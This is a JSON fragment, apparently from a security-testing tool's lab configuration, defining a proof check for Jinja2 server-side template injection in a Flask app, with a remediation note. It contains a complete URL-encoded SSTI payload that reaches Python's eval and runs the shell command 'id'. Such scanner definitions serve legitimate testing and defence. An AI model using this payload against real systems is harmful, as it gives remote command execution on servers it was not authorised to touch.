          ]
        }
      },
      "safeProof": {
        "kind": "commandOutput",
        "level": "shell",
        "activeApprovalRequired": true,
        "method": "GET",
        "path": "/?name=%7b%25+for+c+in+%5b%5d.__class__.__base__.__subclasses__()+%25%7d%7b%25+if+c.__name__+%3d%3d+%27catch_warnings%27+%25%7d%7b%25+for+b+in+c.__init__.__globals__.values()+%25%7d%7b%25+if+b.__class__+%3d%3d+%7b%7d.__class__+%25%7d%7b%25+if+%27eval%27+in+b.keys()+%25%7d%7b%7b+b%5b%27eval%27%5d(%27__import__(%22os%22).popen(%22id%22).read()%27)+%7d%7d%7b%25+endif+%25%7d%7b%25+endif+%25%7d%7b%25+endfor+%25%7d%7b%25+endif+%25%7d%7b%25+endfor+%25%7d",
        "command": "id",
        "expect": {
          "status": 200,
          "bodyMatches": "uid=\\d+\\("
        },
        "finding": {
          "title": "Lab shell proof validated: Flask Jinja2 server-side template command execution",
          "severity": "critical",
          "description": "A scoped local-lab proof executed a controlled OS identity command through Jinja2 SSTI and returned the output in the HTTP response. The proof did not read files, write files, or open a reverse shell.",
          "remediation": "Avoid rendering user-controlled strings as templates; pass user input only as escaped template variables and enable appropriate template sandboxing where applicable."
        }
      }
    },
